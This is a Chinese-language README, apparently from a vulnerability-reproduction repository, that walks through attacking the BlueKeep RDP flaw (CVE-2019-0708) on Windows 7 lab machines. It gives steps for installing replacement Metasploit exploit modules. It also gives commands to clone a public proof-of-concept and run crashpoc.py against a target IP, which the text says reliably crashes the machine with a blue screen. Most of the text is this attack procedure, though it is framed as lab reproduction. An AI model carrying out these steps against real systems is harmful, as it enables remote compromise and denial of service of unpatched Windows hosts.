# CVE-2019-0708

20190514，微软发布补丁，修复了一个严重的RDP远程代码执行漏洞。该漏洞无需身份认证和用户交互，可能形成蠕虫爆发，影响堪比wannycry。下面分别介绍使用metasploit或者使用python编写脚本来执行该攻击。

## 影响版本

| Windows版本系统        |
| ---------------------- |
| Windows 7              |
| Windows Server 2008 R2 |
| Windows Server 2008    |
| Windows 2003           |
| Windows XP             |



## 复现环境

| 角色   | 环境                                 |
| ------ | ------------------------------------ |
| 攻击机 | kali                                 |
| 受害者 | Windows 7 for 32-bit Systems Service |
| 受害者 | Windows 7 for 64-bit Systems Service |



## 攻击流程

### 一、metasploit

1.需要替换metasploit中的四个脚本，脚本已存放在vulnerability\CVE-2019-0708\metasploit模块里，

> 旧版本没有/usr/share/metasploit-framework/modules/exploits/windows/rdp/目录，自行新建该目录即可

```
1.cve_2019_0708_bluekeep_rce.rb 添加到 /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

2.rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

3.rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

4.cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
```

2.

![image-20200506221530739](README.assets/image-20200506221530739.png)

3.不稳定（多尝试几次）

### 二、python脚本

**攻击过程：**

```
1.git clone https://github.com/wanglf/CVE-2019-0708.git

2.cd CVE-2019-0708

3.pip install -r requirements.txt

4.python crashpoc.py 目标IP 目标系统位数64/32
python crashpoc.py 192.168.91.137 32
```

会使电脑变蓝屏，特别稳定

![image-20200506222309649](README.assets/image-20200506222309649.png)

![image-20200506222333583](README.assets/image-20200506222333583.png)

## 参考文章

1. [cve_2019_0708_bluekeep_rce](https://github.com/NAXG/cve_2019_0708_bluekeep_rce)
2. [CVE-2019-0708漏洞利用](https://www.cnblogs.com/replaceroot/p/11367620.html)